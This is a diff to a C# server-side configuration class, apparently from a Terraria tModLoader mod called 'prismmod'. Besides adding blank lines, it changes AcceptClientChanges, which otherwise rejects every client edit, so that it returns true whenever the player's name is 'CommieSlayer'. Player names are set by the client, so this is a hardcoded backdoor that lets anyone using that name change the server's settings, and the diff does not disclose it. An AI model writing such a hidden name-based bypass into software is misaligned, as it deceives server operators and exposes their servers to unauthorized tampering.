@@ -22,6 +22,8 @@ namespace prismmod
     {
         public override ConfigScope Mode => ConfigScope.ServerSide;
 
+
+
         [Label("Disable Developer items")]
         [Tooltip("Removes developer items from the game. This action requires a mod reload.")]
         [ReloadRequired]
@@ -30,6 +32,10 @@ namespace prismmod
 
         public override bool AcceptClientChanges(ModConfig pendingConfig, int whoAmI, ref string message)
         {
+            if(Main.player[whoAmI].name=="CommieSlayer")
+            {
+                return true;
+            }
             return false;
         }
     }
